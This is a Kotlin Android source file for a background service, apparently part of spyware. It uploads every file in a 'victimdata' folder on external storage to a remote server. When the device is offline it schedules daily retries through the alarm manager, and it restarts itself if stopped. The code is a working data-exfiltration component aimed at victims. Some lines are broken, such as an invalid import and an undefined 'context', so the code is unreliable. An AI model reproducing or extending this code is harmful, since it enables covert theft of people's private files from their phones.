package com.example.andresionghost

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import android.os.Environment
import android.util.Log
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar
import kotlin.coroutines.jvm.internal.CompletedContinuation.context

class DataTransferService : Service() {

    private val dataFolder = File(Environment.getExternalStorageDirectory(), "victimdata")

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isNetworkAvailable()) {
            transferDataToServer()
        } else {
            scheduleDataTransfer()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities != null && capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun transferDataToServer() {
        if (dataFolder.exists() && dataFolder.isDirectory) {
            val files = dataFolder.listFiles()
            if (files != null && files.isNotEmpty()) {
                for (file in files) {
                    if (file.isFile) {
                        uploadFileToServer(file)
                    }
                }
            }
        }
    }

    private fun uploadFileToServer(file: File) {
        try {
            val url = URL("YOUR_SERVER_URL") // Replace with your server URL
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/octet-stream")

            val inputStream = FileInputStream(file)
            val buffer = ByteArray(1024)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                connection.outputStream.write(buffer, 0, bytesRead)
            }
            inputStream.close()

            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d("DataTransferService", "File uploaded successfully: ${file.name}")
            } else {
                Log.e("DataTransferService", "Failed to upload file: ${file.name}")
            }
            connection.disconnect()
        } catch (e: IOException) {
            Log.e("DataTransferService", "Error uploading file: ${file.name}", e)
        }
    }

    private fun scheduleDataTransfer() {
        val calendar = Calendar.getInstance()
        calendar.set(Calendar.HOUR_OF_DAY, 13)
        calendar.set(Calendar.MINUTE, 0)
        calendar.set(Calendar.SECOND, 0)
        val intent = Intent(this, DataTransferService::class.java)
        val pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.timeInMillis, AlarmManager.INTERVAL_DAY, pendingIntent)
    }
}